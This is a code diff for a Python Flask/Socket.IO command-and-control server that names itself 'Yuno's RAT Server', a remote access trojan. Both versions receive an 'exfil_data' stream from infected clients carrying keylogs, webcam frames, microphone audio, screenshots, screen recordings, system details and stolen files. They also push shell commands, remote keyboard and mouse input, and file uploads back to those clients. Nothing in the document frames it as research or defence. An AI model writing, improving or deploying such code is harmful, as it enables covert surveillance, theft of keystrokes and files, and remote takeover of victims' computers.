@@ -1,232 +1,104 @@
 #!/usr/bin/env python3
-import os
+import socketio
+import eventlet
 import json
-import datetime
-from flask import Flask, render_template, request, send_from_directory, jsonify
-from flask_socketio import SocketIO, emit
-from werkzeug.utils import secure_filename
-import base64
-import time
+from flask import Flask, render_template
+from datetime import datetime
+import os
 
+# Initialize Flask and SocketIO
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!'
-app.config['UPLOAD_FOLDER'] = 'uploads'
-app.config['DOWNLOAD_FOLDER'] = 'downloads'
-socketio = SocketIO(app, cors_allowed_origins="*")
+sio = socketio.Server(cors_allowed_origins="*")
+app = socketio.WSGIApp(sio, app)
 
-for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
-    if not os.path.exists(folder):
-        os.makedirs(folder)
-
-connected_clients = set()
+# Client information storage
 client_info = {}
 client_activity = {}
 
-def get_files():
-    upload_folder = app.config['UPLOAD_FOLDER']
-    files = [f for f in os.listdir(upload_folder) if os.path.isfile(os.path.join(upload_folder, f))]
-    return sorted(files)
+@sio.event
+def connect(sid, environ):
+    print(f"[*] Client connected: {sid}")
+    client_info[sid] = {"system": {}, "connected_at": datetime.now().isoformat()}
+    client_activity[sid] = {"status": "active"}
+    sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'active'})} for cid, info in client_info.items()], room=sid)
+
+@sio.event
+def disconnect(sid):
+    print(f"[*] Client disconnected: {sid}")
+    if sid in client_info:
+        del client_info[sid]
+        del client_activity[sid]
+    sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'active'})} for cid, info in client_info.items()], broadcast=True)
+
+@sio.event
+def exfil_data(sid, data):
+    try:
+        data = json.loads(data)
+        data_type = data.get("type")
+        client_id = data.get("client_id", sid)
+
+        if data_type == "system_info":
+            client_info[client_id] = {"system": data, "connected_at": datetime.now().isoformat()}
+            sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'active'})} for cid, info in client_info.items()], broadcast=True)
+        elif data_type == "network_data":
+            sio.emit('network_data', {'client_id': client_id, **data}, broadcast=True)
+        elif data_type == "system_data":
+            sio.emit('system_data', {'client_id': client_id, **data}, broadcast=True)
+        elif data_type == "webcam_error" or data_type == "mic_error" or data_type == "screenshot_error" or data_type == "screen_record_error":
+            sio.emit(data_type, {'client_id': client_id, 'message': data.get('message')}, broadcast=True)
+        elif data_type == "screen_record":
+            sio.emit('screen_record', {
+                'client_id': client_id,
+                'frames': data.get('frames')
+            }, broadcast=True)
+        elif data_type == "client_status":
+            client_activity[client_id]["status"] = data.get('status')
+            sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()], broadcast=True)
+        elif data_type == "keylog_data":
+            sio.emit('keylog_data', {'client_id': client_id, 'logs': data.get('logs')}, broadcast=True)
+        elif data_type == "command_output":
+            sio.emit('command_output', {
+                'client_id': client_id,
+                'command': data.get('command'),
+                'output': data.get('output'),
+                'current_dir': data.get('current_dir')
+            }, broadcast=True)
+        elif data_type == "file_download":
+            sio.emit('file_download', {
+                'client_id': client_id,
+                'filename': data.get('filename'),
+                'data': data.get('data')
+            }, broadcast=True)
+        elif data_type == "webcam_data":
+            sio.emit('webcam_data', {'client_id': client_id, 'image': data.get('image')}, broadcast=True)
+        elif data_type == "mic_data":
+            sio.emit('mic_data', {'client_id': client_id, 'audio': data.get('audio')}, broadcast=True)
+        elif data_type == "screenshot_data":
+            sio.emit('screenshot_data', {'client_id': client_id, 'image': data.get('image')}, broadcast=True)
+        print(f"[*] Received {data_type} from {client_id}")
+    except Exception as e:
+        print(f"[!] Error processing exfil_data: {e}")
+
+@sio.event
+def command(sid, data):
+    print(f"[*] Sending command to clients: {data}")
+    sio.emit('command', data, broadcast=True)
+
+@sio.event
+def remote_input(sid, data):
+    print(f"[*] Sending remote input to clients: {data}")
+    sio.emit('remote_input', data, broadcast=True)
+
+@sio.event
+def upload_file(sid, data):
+    print(f"[*] Sending upload command to clients: {data}")
+    sio.emit('upload_file', data, broadcast=True)
 
 @app.route('/')
 def index():
-    files = get_files()
-    return render_template('index.html', clients=list(connected_clients), files=files)
+    return render_template('index.html')
 
-@app.route('/send_command', methods=['POST'])
-def send_command():
-    client_id = request.form.get('client_id')
-    command = request.form.get('command')
-
-    if not client_id or not command:
-        return jsonify({"status": "error", "message": "Missing client_id or command"}), 400
-
-    print(f"[*] Sending command '{command}' to {client_id}")
-    socketio.emit('command', command, to=client_id)
-    return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})
-
-@app.route('/send_remote_input', methods=['POST'])
-def send_remote_input():
-    client_id = request.form.get('client_id')
-    input_data = request.form.get('input_data')
-
-    if not client_id or not input_data:
-        return jsonify({"status": "error", "message": "Missing client_id or input_data"}), 400
-
-    print(f"[*] Sending remote input to {client_id}: {input_data}")
-    socketio.emit('remote_input', json.loads(input_data), to=client_id)
-    return jsonify({"status": "success", "message": f"Remote input sent to {client_id}"})
-
-@app.route('/upload', methods=['POST'])
-def upload_file():
-    if 'file' not in request.files:
-        return jsonify({"status": "error", "message": "No file part"}), 400
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"status": "error", "message": "No selected file"}), 400
-    if file:
-        filename = secure_filename(file.filename)
-        file_data = file.read()
-        file_base64 = base64.b64encode(file_data).decode('utf-8')
-        socketio.emit('upload_file', {
-            "filename": filename,
-            "data": file_base64
-        }, broadcast=True)
-        return jsonify({"status": "success", "message": f"File '{filename}' sent to clients"})
-
-@app.route('/download/<filename>')
-def download(filename):
-    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)
-
-@app.route('/view_file/<filename>')
-def view_file(filename):
-    filename = secure_filename(filename)
-    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    if os.path.exists(file_path):
-        with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
-            content = f.read()
-        return render_template('view_file.html', filename=filename, file_content=content)
-    else:
-        return "File not found", 404
-
-@socketio.on('connect')
-def handle_connect():
-    client_id = request.sid
-    connected_clients.add(client_id)
-    client_activity[client_id] = {"last_active": time.time(), "status": "active"}
-    print(f"[*] Client connected: {client_id}")
-    emit('client_update', list(connected_clients), broadcast=True)
-
-@socketio.on('disconnect')
-def handle_disconnect():
-    client_id = request.sid
-    if client_id in connected_clients:
-        connected_clients.remove(client_id)
-        client_info.pop(client_id, None)
-        client_activity.pop(client_id, None)
-        print(f"[*] Client disconnected: {client_id}")
-        emit('client_update', list(connected_clients), broadcast=True)
-
-@socketio.on('exfil_data')
-def handle_exfil_data(data):
-    client_id = request.sid
-    data = json.loads(data)
-    data_type = data.get('type')
-
-    client_activity[client_id]["last_active"] = time.time()
-    current_time = time.time()
-    for cid, activity in client_activity.items():
-        if current_time - activity["last_active"] > 30:
-            activity["status"] = "idle"
-        else:
-            activity["status"] = "active"
-
-    if data_type == "system_info":
-        username = data.get('system', {}).get('username', None)
-        if not username:
-            socketio.emit('command', 'whoami', to=client_id)
-        else:
-            client_info[client_id] = {
-                "system": data.get('system', {}),
-                "hardware": data.get('hardware', {}),
-                "network": data.get('network', {}),
-                "user": data.get('user', {}),
-                "software": data.get('software', {}),
-                "environment": data.get('environment', {}),
-                "peripherals": data.get('peripherals', {}),
-                "security": data.get('security', {})
-            }
-            client_info[client_id]['username'] = username
-            client_info[client_id]['ip_addresses'] = data.get('network', {}).get('ip_addresses', [])
-            client_info[client_id]['location'] = data.get('network', {}).get('location', 'Unknown')
-        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"{client_id}_{timestamp}_sysinfo.json"
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(data, f, indent=4)
-        print(f"[*] Exfiltrated data saved: {filepath}")
-
-    elif data_type == "command_output":
-        command = data.get('command', 'unknown')
-        output = data.get('output', '')
-        current_dir = data.get('current_dir', 'unknown')
-        if command.strip().lower() == 'whoami':
-            username = output.strip()
-            if client_id not in client_info:
-                client_info[client_id] = {}
-            client_info[client_id]['username'] = username
-        emit('command_output', {
-            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            'client_id': client_id,
-            'command': command,
-            'output': output,
-            'current_dir': current_dir
-        }, broadcast=True)
-
-    elif data_type == "network_data":
-        emit('network_data', {
-            'client_id': client_id,
-            'timestamp': data.get('timestamp'),
-            'bytes_sent': data.get('bytes_sent'),
-            'bytes_recv': data.get('bytes_recv'),
-            'sent_speed_mbps': data.get('sent_speed_mbps'),
-            'recv_speed_mbps': data.get('recv_speed_mbps')
-        }, broadcast=True)
-
-    elif data_type == "system_data":
-        emit('system_data', {
-            'client_id': client_id,
-            'timestamp': data.get('timestamp'),
-            'cpu_usage_percent': data.get('cpu_usage_percent'),
-            'memory_usage_mb': data.get('memory_usage_mb')
-        }, broadcast=True)
-
-    elif data_type == "webcam_data":
-        emit('webcam_data', {
-            'client_id': client_id,
-            'image': data.get('image')
-        }, broadcast=True)
-
-    elif data_type == "mic_data":
-        emit('mic_data', {
-            'client_id': client_id,
-            'audio': data.get('audio')
-        }, broadcast=True)
-
-    elif data_type == "screenshot_data":
-        emit('screenshot_data', {
-            'client_id': client_id,
-            'image': data.get('image')
-        }, broadcast=True)
-
-    elif data_type == "screen_stream":
-        emit('screen_stream', {
-            'client_id': client_id,
-            'image': data.get('image')
-        }, broadcast=True)
-
-    elif data_type == "keylog_data":
-        emit('keylog_data', {
-            'client_id': client_id,
-            'logs': data.get('logs')
-        }, broadcast=True)
-
-    elif data_type == "file_download":
-        filename = data.get('filename')
-        file_data = base64.b64decode(data.get('data'))
-        filepath = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
-        with open(filepath, 'wb') as f:
-            f.write(file_data)
-        print(f"[*] Received file {filename} from client {client_id}")
-
-    client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
-    emit('client_info', client_info_list, broadcast=True)
-
-@socketio.on('request_client_info')
-def handle_request_client_info():
-    client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
-    emit('client_info', client_info_list)
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     print("=== Yuno's RAT Server ===")
     print("A remote access server by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
+    eventlet.wsgi.server(eventlet.listen(('', 5000)), app)
